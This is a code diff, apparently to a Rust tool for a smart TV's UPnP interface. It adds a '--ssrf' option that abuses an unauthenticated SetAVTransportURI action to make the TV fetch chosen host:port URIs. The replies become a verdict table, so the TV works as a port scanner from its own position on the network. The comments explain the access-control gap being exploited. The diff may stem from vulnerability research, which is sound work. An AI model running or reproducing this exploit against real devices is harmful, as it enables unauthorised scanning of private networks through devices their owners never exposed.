@@ -726,6 +726,9 @@ fn usage() {
   --ua <name>        control-point name sent as User-Agent; dmr feeds this to
                      rdm_init_device as the device name, so it is the second
                      identity field besides the MAC
+  --ssrf <host>      make the TV fetch http://host:port/ for a list of ports
+                     and report each result - an unauthenticated port scanner
+                     run from the TV's position; --ports to override the list
   --soap <ctrlURL>   call any UPnP action; needs --ns and --action, optional
                      --args with the inner XML
   --ssdp [ST]        M-SEARCH the LAN for UPnP devices; default ST is
@@ -900,6 +903,47 @@ fn run() {
             Some(v) => println!("SetVolume did not take effect (read back {v}); see the codes above."),
             None => println!("could not read the volume back."),
         }
+        return;
+    }
+
+    // --ssrf: make the TV probe addresses for us. SetAVTransportURI is one of the
+    // actions an unapproved device may call (getAclPolicy answers "unknown" and
+    // the handler runs anyway - unlike Play, which needs PERMITTED), and the TV
+    // resolves and fetches the URI *synchronously* before answering: its HEAD
+    // arrives before the SOAP reply does. So the reply code is an oracle for
+    // whatever is at the far end, and the far end is reached from the TV's
+    // position on the network, not ours.
+    if args.has("--ssrf") {
+        let host = args.val("--ssrf").unwrap_or_else(|| "127.0.0.1".into());
+        let ports: Vec<u16> = args
+            .val("--ports")
+            .unwrap_or_else(|| "80,443,22,23,8080,8001,8443,9197,554,1900,53,3389,5000".into())
+            .split(',')
+            .filter_map(|p| p.trim().parse().ok())
+            .collect();
+        println!("=== probing {host} through the TV (SetAVTransportURI, unauthenticated) ===");
+        println!("    the TV fetches the URI before replying, so its answer describes the target");
+        for p in ports {
+            let uri = format!("http://{host}:{p}/");
+            let t0 = Instant::now();
+            let (c, raw) = tv.av(
+                "SetAVTransportURI",
+                &format!("<CurrentURI>{}</CurrentURI><CurrentURIMetaData></CurrentURIMetaData>",
+                         xesc(&uri)),
+            );
+            let ms = t0.elapsed().as_millis();
+            let code = tag(&raw, "errorCode").unwrap_or("-");
+            let verdict = match (c, code) {
+                (200, _) => "OPEN - the TV got an answer it accepted",
+                (_, "716") => "reachable, but not playable content",
+                (_, "714") => "reachable, unsupported media type",
+                (_, "701") => "reachable (transition refused)",
+                _ if ms > 2500 => "no answer (filtered/timeout)",
+                _ => "refused/closed",
+            };
+            println!("    {host}:{p:<5} HTTP {c:<4} upnp={code:<4} {ms:>5}ms  {verdict}");
+        }
+        println!("\nEverything above was fetched by the TV, from the TV's vantage point.");
         return;
     }
 
